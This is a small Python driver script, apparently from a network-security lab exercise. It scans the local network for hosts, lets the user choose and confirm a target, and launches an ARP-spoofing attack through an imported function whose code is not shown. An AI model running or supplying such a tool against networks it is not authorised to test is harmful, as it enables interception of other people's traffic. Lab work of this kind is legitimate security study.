import sys
import socket

from e1.run import find_network_hosts
from e2.arp import perform_arp_spoof


def select_target_host(hosts):
    print("\nSelect the target host to perform the attack:")
    for host, i in zip(hosts, range(1, len(hosts)+1)):
        print(f"({i}): {host}")
    print(f"({len(hosts)+1}): Exit")

    target_host = input("\nEnter the number of the target host: ")

    if not target_host.isdigit() or int(target_host) < 1 or int(target_host) > len(hosts)+1:
        print("Error: Invalid input")
        return select_target_host(hosts)

    if int(target_host) == len(hosts)+1:
        print("Exiting...")
        sys.exit(0)
        return None

    target_host = hosts[int(target_host)-1]

    confirmation = input(f"Do you confirm the target {target_host}? (Y/n): ")

    if confirmation.lower() == 'n' or confirmation.lower() == 'no':
        return select_target_host(hosts)
    elif confirmation and (confirmation.lower() != 'y' and confirmation.lower() != 'yes'):
        print("Error: Invalid input")
        return select_target_host(hosts)

    return target_host


def main():

    ########## 1 ##########
    hosts = find_network_hosts()

    if len(hosts) == 0:
        print("Error: No active hosts found in the network")
        return

    print(f"\nFound {len(hosts)} active host(s) in the network")

    target_host = select_target_host(hosts)

    print(f"\nTarget host: {target_host}")

    ########## 2 ##########
    perform_arp_spoof(target_host)


if __name__ == '__main__':
    main()
